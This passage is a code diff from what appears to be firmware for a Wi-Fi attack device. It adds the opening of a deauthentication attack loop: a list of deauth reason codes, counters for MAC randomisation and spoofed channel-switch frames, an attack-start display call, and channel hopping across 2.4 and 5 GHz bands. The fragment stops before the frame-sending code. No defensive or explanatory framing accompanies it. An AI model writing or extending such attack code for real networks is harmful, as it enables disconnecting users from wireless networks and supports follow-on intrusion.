@@ -75,3 +75,24 @@ static void _runDeauthLoop() {
         return;
     }
 
+    int last_ch = -1;
+    uint32_t fast_mac_counter = 0;
+    size_t csa_ghost_idx = 0;
+    const uint16_t reasons[] = {g_app.config.deauth_reason, 8, 1, 4, 6, 7};
+    const int total_targets = (int)g_deauth_channels.size();
+
+    oled_attack_start();
+    g_app.channel_needs_restore = true;
+
+    while (g_app.attack_mode == AttackMode::DEAUTH) {
+        for (int ch : target_channels) {
+            if (ch != last_ch) {
+                wext_set_channel(WLAN0_NAME, ch);
+                if (last_ch >= 0 && ((last_ch <= 14 && ch > 14) || (last_ch > 14 && ch <= 14))) {
+                    delay(BAND_SWITCH_DELAY_MS);
+                } else {
+                    delay(SAME_BAND_DELAY_MS);
+                }
+                last_ch = ch;
+            }
+
